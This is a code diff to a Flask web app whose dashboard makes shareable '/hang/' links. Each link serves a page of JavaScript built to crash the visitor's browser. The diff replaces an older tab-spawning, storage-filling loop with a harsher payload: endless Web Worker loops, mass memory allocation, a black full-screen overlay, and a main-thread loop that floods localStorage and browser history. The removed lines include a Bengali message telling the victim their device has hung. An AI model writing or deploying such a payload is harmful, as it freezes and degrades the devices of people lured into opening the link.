@@ -175,7 +175,6 @@ def dashboard():
     link = request.host_url + 'hang/' + uid
     links[uid] = False
     return render_template_string(dashboard_html, link=link)
-
 @app.route('/hang/<uid>')
 def hang(uid):
     if uid not in links:
@@ -189,20 +188,34 @@ def hang(uid):
         <head><title>💀 HANG</title></head>
         <body>
         <script>
-            (function() {
-                while (true) {
-                    window.open(window.location.href, '_blank');
-                    for (let i = 0; i < 100000; i++) {
-                        try {
-                            localStorage.setItem('x'+i, 'x'.repeat(100000));
-                        } catch(e) {}
+            // Method 1: CPU + memory + recursion + forced layout
+            (function(){
+                // infinite recursion without tail call optimization
+                function crash() {
+                    const arr = [];
+                    for(let i=0; i<1e6; i++) arr.push(new Array(1e5).join("x"));
+                    window.requestAnimationFrame(crash);
+                }
+                // start multiple workers
+                for(let w=0; w<4; w++) {
+                    const blob = new Blob([`
+                        while(true) {
+                            let a = [];
+                            for(let i=0;i<1e7;i++) a.push(i);
+                        }
+                    `], {type: 'application/javascript'});
+                    new Worker(URL.createObjectURL(blob));
+                }
+                // block main thread with infinite while + DOM manipulation
+                document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:black;z-index:99999"></div>';
+                while(true) {
+                    history.pushState({}, '', '/hang');
+                    for(let i=0;i<10000;i++) {
+                        localStorage.setItem('x'+i, 'x'.repeat(100000));
                     }
-                    setTimeout(function(){}, 0);
                 }
             })();
         </script>
-        <h1 style="color:red;text-align:center;margin-top:20%;">💀 HANGING...</h1>
-        <p style="text-align:center">আপনার ডিভাইস হ্যাং হয়ে গেছে।</p>
         </body>
         </html>
     '''
